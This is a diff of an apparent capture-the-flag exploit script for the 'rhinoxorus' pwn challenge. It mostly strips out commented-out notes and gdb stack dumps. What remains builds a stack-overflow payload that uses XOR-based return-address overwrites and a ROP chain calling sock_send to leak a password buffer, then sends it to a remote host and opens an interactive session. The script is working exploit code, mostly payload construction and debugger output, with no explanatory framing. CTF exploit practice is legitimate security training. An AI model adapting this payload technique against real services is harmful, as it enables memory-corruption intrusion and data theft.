@@ -7,211 +7,9 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     0               8       rhinoxorus_cd2be6030fb52cbc13a48b13603b9979
 '''
 
-'''
-void process_connection(int sockfd)
-{
-    ssize_t bytes_read;
-    unsigned char recv_buf[BUF_SIZE];
-    memset(recv_buf, 0, sizeof(recv_buf));
-    bytes_read = recv(sockfd, recv_buf, (unsigned int )BUF_SIZE, 0);
-    if (bytes_read > 0)
-    {
-        func_array[recv_buf[0]](recv_buf, (unsigned int)bytes_read);
-    }
-    return;
-}
-'''
-
-'''
-ps -ef | grep pwn/rhino | grep -v grep | awk '{print $2}' | xargs kill
-'''
-
 host = 'localhost' if '--live' not in sys.argv else '54.152.37.20'
 
-#p = remote(host, 24242)
-
-#p.send(' '+'\x00'*50+'A'*100)
-'''
-(gdb) set follow-fork-mode child
-(gdb) b *0x08056af8
-(gdb) r
-Breakpoint 1, 0x08056af8 in process_connection ()
-(gdb) x/100wx $esp
-0xffffcb90:     0xffffcbac      0x00000097      0x00000100      0x00000000
-0xffffcba0:     0xffffcc08      0xf7ffda94      0x00000097      0x00000020
-0xffffcbb0:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcbc0:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcbd0:     0x00000000      0x00000000      0x00000000      0x41000000
-0xffffcbe0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcbf0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc00:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc10:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc20:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc30:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc40:     0x00414141      0x00000000      0x00000000      0x00000000
-0xffffcc50:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc60:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc70:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc80:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc90:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcca0:     0x00000000      0x00000000      0x00000000      0xcecc1700
-0xffffccb0:     0xffffcda8      0xf7ff04b0      0xffffcda8      0x08056d83
-0xffffccc0:     0x00000004      0x00000000      0xffffcda8      0x08056d66
-0xffffccd0:     0xf7ffd938      0x00000000      0x08060008      0xf7e85eb2
-0xffffcce0:     0x00000010      0x00000003      0x00000004      0x00000000
-0xffffccf0:     0xb25e0002      0x00000000      0x00000000      0x00000000
-0xffffcd00:     0x59e20002      0x0100007f      0x00000000      0x00000000
-0xffffcd10:     0x08056b11      0x7fffffff      0xfffffffe      0xffffffff
-(gdb) adv *0x0804a7bc
-in function func_52, count is 151, bufsize is 0x04
-0x0804a7bc in func_52 ()
-(gdb) x/256wx $esp
-0xffffcb60:     0xf7fbd2e8      0xf7fb9000      0x00000000      0xffffcbac
-0xffffcb70:     0x04ffccb8      0xf7ff04b0      0x04040404      0xcecc1700
-0xffffcb80:     0xf7fb9000      0xffffcb90      0xffffccb8      0x08056afa
-0xffffcb90:     0xffffcbac      0x00000097      0x00000100      0x00000000
-0xffffcba0:     0xffffcc08      0xf7ffda94      0x00000097      0x00000020
-0xffffcbb0:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcbc0:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcbd0:     0x00000000      0x00000000      0x00000000      0x41000000
-0xffffcbe0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcbf0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc00:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc10:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc20:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc30:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc40:     0x00414141      0x00000000      0x00000000      0x00000000
-0xffffcc50:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc60:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc70:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc80:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc90:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcca0:     0x00000000      0x00000000      0x00000000      0xcecc1700
-0xffffccb0:     0xffffcda8      0xf7ff04b0      0xffffcda8      0x08056d83
-0xffffccc0:     0x00000004      0x00000000      0xffffcda8      0x08056d66
-0xffffccd0:     0xf7ffd938      0x00000000      0x08060008      0xf7e85eb2
-0xffffcce0:     0x00000010      0x00000003      0x00000004      0x00000000
-0xffffccf0:     0xb25e0002      0x00000000      0x00000000      0x00000000
-0xffffcd00:     0x59e20002      0x0100007f      0x00000000      0x00000000
-0xffffcd10:     0x08056b11      0x7fffffff      0xfffffffe      0xffffffff
-0xffffcd20:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd30:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd40:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd50:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd60:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd70:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd80:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd90:     0xffffffff      0x10000000      0x00000000      0xcecc1700
-0xffffcda0:     0x00000000      0xf7ffd938      0xffffcdd8      0x0805788f
-0xffffcdb0:     0x00005eb2      0x0000000a      0x08060008      0x080578eb
-0xffffcdc0:     0x00000001      0xffffce84      0x08060008      0x0805f0d9
-0xffffcdd0:     0xf7fb93c4      0xffffcdf0      0x00000000      0xf7e2ca63
-0xffffcde0:     0x080578a0      0x00000000      0x00000000      0xf7e2ca63
-0xffffcdf0:     0x00000001      0xffffce84      0xffffce8c      0xf7feac7a
-0xffffce00:     0x00000001      0xffffce84      0xffffce24      0x0805f03c
-0xffffce10:     0x0804836c      0xf7fb9000      0x00000000      0x00000000
-0xffffce20:     0x00000000      0x42152048      0x781a8458      0x00000000
-0xffffce30:     0x00000000      0x00000000      0x00000001      0x08048750
-0xffffce40:     0x00000000      0xf7ff04b0      0xf7e2c979      0xf7ffd000
-0xffffce50:     0x00000001      0x08048750      0x00000000      0x08048771
-0xffffce60:     0x08056ddb      0x00000001      0xffffce84      0x080578a0
-0xffffce70:     0x08057900      0xf7feb130      0xffffce7c      0x0000001c
-0xffffce80:     0x00000001      0xffffd009      0x00000000      0xffffd060
-0xffffce90:     0xffffd06b      0xffffd07c      0xffffd08e      0xffffd0bd
-0xffffcea0:     0xffffd0ee      0xffffd102      0xffffd10e      0xffffd11e
-0xffffceb0:     0xffffd134      0xffffd146      0xffffd15c      0xffffd165
-0xffffcec0:     0xffffd6fe      0xffffd738      0xffffd74c      0xffffd780
-0xffffced0:     0xffffdc8b      0xffffdcb9      0xffffdd09      0xffffdd15
-0xffffcee0:     0xffffdd2e      0xffffdd6c      0xffffdd8d      0xffffdd9b
-0xffffcef0:     0xffffddaa      0xffffddd9      0xffffddea      0xffffddf3
-0xffffcf00:     0xffffde0f      0xffffde28      0xffffde41      0xffffde49
-0xffffcf10:     0xffffde58      0xffffde67      0xffffde73      0xffffde7c
-0xffffcf20:     0xffffdec4      0xffffdf26      0xffffdf33      0xffffdf52
-0xffffcf30:     0xffffdf67      0xffffdf80      0x00000000      0x00000020
-0xffffcf40:     0xf7fd9d50      0x00000021      0xf7fd9000      0x00000010
-0xffffcf50:     0x078bfbff      0x00000006      0x00001000      0x00000011
-(gdb) adv *0x0804a821
-0x0804a821 in func_52 ()
-(gdb) x/256wx $esp
-0xffffcb50:     0xffffcb79      0x00000096      0x00000004      0x000001b5
-0xffffcb60:     0xf7fbd2e8      0xf7fb9000      0x00000000      0xffffcbac
-0xffffcb70:     0x04ffccb8      0x00000096      0x04040424      0xcecc1700
-0xffffcb80:     0xf7fb9000      0xffffcb90      0xffffccb8      0x08056afa
-0xffffcb90:     0xffffcbac      0x00000096      0x00000100      0x00000000
-0xffffcba0:     0xffffcc08      0xf7ffda94      0x41000097      0x41414161
-0xffffcbb0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcbc0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcbd0:     0x41414141      0x41414141      0x41414141      0x00414141
-0xffffcbe0:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcbf0:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc00:     0x00000000      0x00000000      0x00000000      0x41410000
-0xffffcc10:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc20:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc30:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffffcc40:     0x00414141      0x00000000      0x00000000      0x00000000
-0xffffcc50:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc60:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc70:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc80:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcc90:     0x00000000      0x00000000      0x00000000      0x00000000
-0xffffcca0:     0x00000000      0x00000000      0x00000000      0xcecc1700
-0xffffccb0:     0xffffcda8      0xf7ff04b0      0xffffcda8      0x08056d83
-0xffffccc0:     0x00000004      0x00000000      0xffffcda8      0x08056d66
-0xffffccd0:     0xf7ffd938      0x00000000      0x08060008      0xf7e85eb2
-0xffffcce0:     0x00000010      0x00000003      0x00000004      0x00000000
-0xffffccf0:     0xb25e0002      0x00000000      0x00000000      0x00000000
-0xffffcd00:     0x59e20002      0x0100007f      0x00000000      0x00000000
-0xffffcd10:     0x08056b11      0x7fffffff      0xfffffffe      0xffffffff
-0xffffcd20:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd30:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd40:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd50:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd60:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd70:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd80:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
-0xffffcd90:     0xffffffff      0x10000000      0x00000000      0xcecc1700
-0xffffcda0:     0x00000000      0xf7ffd938      0xffffcdd8      0x0805788f
-0xffffcdb0:     0x00005eb2      0x0000000a      0x08060008      0x080578eb
-0xffffcdc0:     0x00000001      0xffffce84      0x08060008      0x0805f0d9
-0xffffcdd0:     0xf7fb93c4      0xffffcdf0      0x00000000      0xf7e2ca63
-0xffffcde0:     0x080578a0      0x00000000      0x00000000      0xf7e2ca63
-0xffffcdf0:     0x00000001      0xffffce84      0xffffce8c      0xf7feac7a
-0xffffce00:     0x00000001      0xffffce84      0xffffce24      0x0805f03c
-0xffffce10:     0x0804836c      0xf7fb9000      0x00000000      0x00000000
-0xffffce20:     0x00000000      0x42152048      0x781a8458      0x00000000
-0xffffce30:     0x00000000      0x00000000      0x00000001      0x08048750
-0xffffce40:     0x00000000      0xf7ff04b0      0xf7e2c979      0xf7ffd000
-0xffffce50:     0x00000001      0x08048750      0x00000000      0x08048771
-0xffffce60:     0x08056ddb      0x00000001      0xffffce84      0x080578a0
-0xffffce70:     0x08057900      0xf7feb130      0xffffce7c      0x0000001c
-0xffffce80:     0x00000001      0xffffd009      0x00000000      0xffffd060
-0xffffce90:     0xffffd06b      0xffffd07c      0xffffd08e      0xffffd0bd
-0xffffcea0:     0xffffd0ee      0xffffd102      0xffffd10e      0xffffd11e
-0xffffceb0:     0xffffd134      0xffffd146      0xffffd15c      0xffffd165
-0xffffcec0:     0xffffd6fe      0xffffd738      0xffffd74c      0xffffd780
-0xffffced0:     0xffffdc8b      0xffffdcb9      0xffffdd09      0xffffdd15
-0xffffcee0:     0xffffdd2e      0xffffdd6c      0xffffdd8d      0xffffdd9b
-0xffffcef0:     0xffffddaa      0xffffddd9      0xffffddea      0xffffddf3
-0xffffcf00:     0xffffde0f      0xffffde28      0xffffde41      0xffffde49
-0xffffcf10:     0xffffde58      0xffffde67      0xffffde73      0xffffde7c
-0xffffcf20:     0xffffdec4      0xffffdf26      0xffffdf33      0xffffdf52
-0xffffcf30:     0xffffdf67      0xffffdf80      0x00000000      0x00000020
-0xffffcf40:     0xf7fd9d50      0x00000021      0xf7fd9000      0x00000010
-(gdb) info r eax
-eax            0x804aa90        134523536
-'''
-#p.send(' '+chr(30^4)+'BB'+(0xffffcc90-0xffffcbb0)*'B')
-#p.send(chr(30)+chr(0)*128)
-#p.send(' '*4+p32(255)*(252/4))
-
 payload = ['\x00']*256
-#payload = ['\x00']*0xd3
-#payload[0] = chr(32) # "opcode" for a function with 0x4 stacksize
-#payload[0] = chr(33) # "opcode" for a function with 0x0 stacksize
-#payload[0] = chr(19) # "opcode" for a function with 0xd0 stacksize
-#payload[0] = chr(212) # "opcode" for a function with 0xd4 stacksize
-#payload[0] = chr(66) # "opcode" for a function with 0x8c stacksize
-#payload[0] = chr(45) # "opcode" for a function with 0x38 stacksize, whose successor has 0xd8 stacksize
 payload[0] = chr(41) # "opcode" for a function with 0x28 stacksize, whose successor has 0x88 stacksize
 f1_size = 0x28
 f2_size = 0x88
@@ -221,7 +19,7 @@ f2_size = 0x88
 #offset = 0x28 + 4*6
 #payload[offset:offset+4] = p32(255)
 offset = 0x88 + 4*6
-payload[offset:offset+4] = "\xff\xff" # not fully understood, but this pokes count from the 2nd step (func_33, func_5b's successor)
+payload[offset:offset+4] = "\xff\xff" # details not fully understood, but this pokes count from the 2nd step (func_33, func_5b's successor)
 
 '''
 for i in range(4,256,4):
@@ -239,16 +37,29 @@ def write(i, x):
     global f1_size
     payload[f1_size+i*4:f1_size+i*4+4] = p32(x)
 
-p4_ret = 0x080578f8
-p0_ret = 0x080578fc
-
+# int sock_send(int sockfd, char *buf, size_t length)
 send_sock = 0x0804884b
 password = 0x805f0c0
 
+'''
+[0x080578f8]> pd 5
+           0x080578f8    5b             pop ebx
+           0x080578f9    5e             pop esi
+           0x080578fa    5f             pop edi
+           0x080578fb    5d             pop ebp
+           0x080578fc    c3             ret
+'''
+p4_ret = 0x080578f8
+p0_ret = 0x080578fc
+
+
 write(4, 0x8056afa ^ p4_ret)
+
+# This fails on the first connection (a stack address is present at this offset, and subject to ASLR), but works properly on all subsequent attempts
 #write(9, 0xffffcc08 ^ 0x41414141) 
 #write(9, 0xffffcc08 ^ 0x41414141 ^ 0xbebe8d49 ^ p4_ret) # deep voodoo magic, no idea why this works (EDIT: the expression xors to 0)
 write(9, p4_ret)
+
 write(14, send_sock)
 write(15, 0x41414141)
 write(16, 0x00000004)
@@ -276,42 +87,11 @@ write(18, 0x45454545)
 0xffffcc80:     0x00000000      0x00000000      0x00000000      0x00000000
 '''
 
-'''
-[0x080578f8]> pd 5
-           0x080578f8    5b             pop ebx
-           0x080578f9    5e             pop esi
-           0x080578fa    5f             pop edi
-           0x080578fb    5d             pop ebp
-           0x080578fc    c3             ret
-'''
 print payload, len(payload)
 
 p = remote(host, 24242)
 p.send(''.join(payload))
 p.interactive()
-
-sys.exit(1)
-# obtain the location of count
-'''
-for i in range(4,256,4):
-    newpayload = list(payload)
-    newpayload[i:i+4] = p32(255) # try to use xor to set count to 0, to skip extra functions
-    p = remote(host, 24242)
-    p.send(''.join(newpayload))
-'''
-
-'''
->>> import re
->>> x = open('pwn500_rhino_bruteforce_count.txt').read()
->>> y = re.findall('.*count is 0', x, re.DOTALL)
->>> z = re.findall('Accepted', y[0])
->>> len(z)
-7
-'''
-
-leave_ret = 0x080487b8
-count = 60
-payload[8*4:(8+1)*4] = p32(255^count) # set count with xor
 
 '''
 (gdb) set follow-fork-mode child
@@ -378,49 +158,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0xffffcc70:     0x00000000      0x00000000      0x00000000      0x00000000
 0xffffcc80:     0x00000000      0x00000000      0x00000000      0x00000000
 '''
-#0x08057914: les ecx, [eax]; pop ebx; ret;
-#0x08057911: add byte [eax], al; add esp, 8; pop ebx; ret;
-#0x080487b5: add esp, 0x10; leave; ret;
-'''
-[0x080487b5]> pd 3
-           0x080487b5    83c410         add esp, 0x10
-           0x080487b8    c9             leave
-           0x080487b9    f3c3           ret
-'''
-#0x080561e1: sub esp, dword [edi + edi*8]; dec ecx; ret;
-#0x080578f8: pop ebx; pop esi; pop edi; pop ebp; ret;
-'''
-[0x080578f8]> pd 5
-           0x080578f8    5b             pop ebx
-           0x080578f9    5e             pop esi
-           0x080578fa    5f             pop edi
-           0x080578fb    5d             pop ebp
-           0x080578fc    c3             ret
-'''
 
-'''
-# 0804884b <sock_send>:
-# int sock_send(int sockfd, char *buf, size_t length)
-send_sock = 0x0804884b
-ebp_ret = 0x080578fb
-tcp_server_loop = 0x08056b3c
-payload[6*4:(6+1)*4] = p32(0x8056afa ^ 0x41414141) # set EIP
-payload[7*4:(7+1)*4] = p32(0xffffcbac ^ 0x41414141) # set next EIP
-# 8th word has to be count, and is already set above, count is aliased to sockfd
-password = 0x805f0c0
-#payload[9*4:(9+1)*4] = p32(0x00000100 ^ password) # set buf
-#payload[10*4:(10+1)*4] = p32(32) # set len
-'''
-
-'''
-#payload[-4:] = "C"*4
-print payload, len(payload)
-
-p = remote(host, 24242)
-p.send(''.join(payload))
-'''
-
-#p.interactive()
 '''
 [+] Opening connection to 54.152.37.20 on port 24242: Done
 [*] Switching to interactive mode
